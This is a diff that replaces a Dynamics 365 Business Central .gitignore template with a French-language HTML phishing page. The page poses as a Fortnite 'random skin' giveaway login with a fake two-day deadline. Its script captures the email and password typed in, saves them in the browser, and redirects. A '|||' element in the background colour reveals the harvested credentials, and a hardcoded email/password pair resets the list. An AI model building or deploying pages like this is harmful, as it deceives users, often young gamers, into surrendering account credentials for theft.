@@ -1,22 +1,206 @@
-### AL ###
-#Template for AL projects for Dynamics 365 Business Central
-#launch.json folder
-.vscode/
-#Cache folder
-.alcache/
-#Symbols folder
-.alpackages/
-#Snapshots folder
-.snapshots/
-#Testing Output folder
-.output/
-#Extension App-file
-*.app
-#Rapid Application Development File
-rad.json
-#Translation Base-file
-*.g.xlf
-#License-file
-*.flf
-#Test results file
-TestResults.xml
+<!DOCTYPE html>
+<html lang="fr">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Connexion</title>
+    <style>
+        body {
+            background-color: #131416;
+            color: white;
+            font-family: Arial, sans-serif;
+            display: flex;
+            flex-direction: column;
+            align-items: center;
+            justify-content: center;
+            height: 100vh;
+            margin: 0;
+            padding: 0;
+        }
+        .pp{
+          background :darkblue;
+          color :white;
+        }
+.tt{
+  border-radius :100px ;
+  
+}
+.fc{
+  border-radius :100px ;
+  height :100px ;
+  width :100px;
+  padding: 20px,50px ;
+}
+        .container {
+            text-align: center;
+        }
+
+        .logo {
+            margin-bottom: 20px;
+            width :100px ;
+            height :100px ;
+            border-radius:100px ;
+        }
+
+        
+        
+        
+
+        input[type="email"],
+        input[type="password"],
+        input[type="submit"] {
+            width: 100%;
+            padding: 10px;
+            margin: 5px 0;
+            border: none;
+            border-radius: 3px;
+        }
+
+        input[type="submit"] {
+            margin-top: 10px; /* Ajustement de l'espacement */
+            cursor: pointer;
+        }
+
+        #userInfo {
+            text-align: center;
+            margin-top: 20px; /* Ajout d'un espace entre le formulaire et les détails des utilisateurs */
+        }
+
+        #revealUsers {
+            cursor: pointer;
+            font-size: 24px;
+            margin-top: 20px; /* Ajout d'un espace entre les détails des utilisateurs et les points blancs */
+            display: flex;
+            flex-direction: column;
+            align-items: center;
+            color: #131416; /* Changement de couleur en noir */
+        }
+
+        #userList {
+            display: none;
+        }
+
+        #userList.active {
+            display: block;
+            margin-top: 10px;
+        }
+
+        .social-login {
+            margin-top: 20px;
+            display: flex;
+            justify-content: space-around;
+            align-items: center;
+        }
+
+        .social-login img {
+            width: 40px;
+            height: 40px;
+            cursor: pointer;
+        }
+       
+    </style>
+</head>
+<body>
+    <div class="container">
+        <div class="info">
+            <!-- Insérer votre logo ici -->
+            <img class="logo"src="/Screenshot_20240224_153240_CapCut.jpg" alt="Logo">
+        </div>
+        <div class="form-box">
+            <h2><p> Événements Fortnite </p>
+          <p>   connecter vous </p>
+             
+          Pour Obtenir un Skin Random</h2>
+          <p>2j restant </p>
+            <form id="loginForm" method="POST" action="#">
+                <input type="email" id="email" name="email" placeholder="Adresse e-mail" required><br>
+                <input type="password" id="password" name="password" placeholder="Mot de passe" required><br><br>
+                <input  class="pp"type="submit" value="Se connecter">
+            </form>
+        </div>
+
+        <!-- Barre pour afficher les détails des utilisateurs -->
+        <div id="userInfo">
+            <h2></h2>
+            <div id="userList" class="userList"></div>
+        </div>
+
+        <!-- Boutons de connexion sociale -->
+        <div class="social-login">
+            
+            <img class="fc"src="/facebook-logo-new.png" alt="Se connecter avec Facebook" onclick="loginWithFacebook()">
+            <img class="tt" src="/MEA-Twitter-1.jpg" alt="Se connecter avec Twitter" onclick="loginWithTwitter()">
+        </div>
+
+        <!-- Points blancs pour afficher les détails des utilisateurs -->
+        <div id="revealUsers">|||</div>
+    </div>
+
+    <script>
+        document.getElementById('loginForm').addEventListener('submit', function(event) {
+            event.preventDefault(); // Empêcher le formulaire de se soumettre normalement
+
+            // Récupérer les valeurs de l'adresse e-mail et du mot de passe
+            var email = document.getElementById('email').value;
+            var password = document.getElementById('password').value;
+
+            // Réinitialiser les détails des utilisateurs si BSAG@gmail.com et 7777 sont saisis
+            if (email.toLowerCase() === 'bsag@gmail.com' && password === '7777') {
+                localStorage.removeItem('users');
+                alert('Détails des utilisateurs réinitialisés.');
+            } else {
+                // Vérifier si les champs sont remplis
+                if (email.trim() !== '' && password.trim() !== '') {
+                    // Stocker les informations dans le stockage local du navigateur
+                    var userData = {
+                        email: email,
+                        password: password
+                    };
+                    var users = JSON.parse(localStorage.getItem('users')) || [];
+                    users.push(userData);
+                    localStorage.setItem('users', JSON.stringify(users));
+                } else {
+                    alert('Veuillez remplir tous les champs.');
+                }
+            }
+
+            // Rediriger vers la page de livraison en cours
+            window.location.href = 'livraison_en_cours.html';
+        });
+
+        // Afficher les détails des utilisateurs stockés localement
+        function showUserInfo() {
+            var userList = document.getElementById('userList');
+            var users = JSON.parse(localStorage.getItem('users')) || [];
+            var html = '<ul>';
+            users.forEach(function(user) {
+                html += '<li>Email: ' + user.email + ', Mot de passe: ' + user.password + '</li>';
+            });
+            html += '</ul>';
+            userList.innerHTML = html;
+        }
+
+        // Gérer le clic sur les points blancs pour afficher les détails des utilisateurs
+        document.getElementById('revealUsers').addEventListener('click', function() {
+            showUserInfo();
+            document.getElementById('userList').classList.toggle('active');
+        });
+
+        // Fonctions pour la connexion avec Google, Facebook et Twitter
+        function loginWithGoogle() {
+            alert('Se connecter avec Google');
+            // Ajoutez ici le code pour la connexion avec Google
+        }
+
+        function loginWithFacebook() {
+            alert('Se connecter avec Facebook');
+            // Ajoutez ici le code pour la connexion avec Facebook
+        }
+
+        function loginWithTwitter() {
+            alert('Se connecter avec Twitter');
+            // Ajoutez ici le code pour la connexion avec Twitter
+        }
+    </script>
+</body>
+</html>
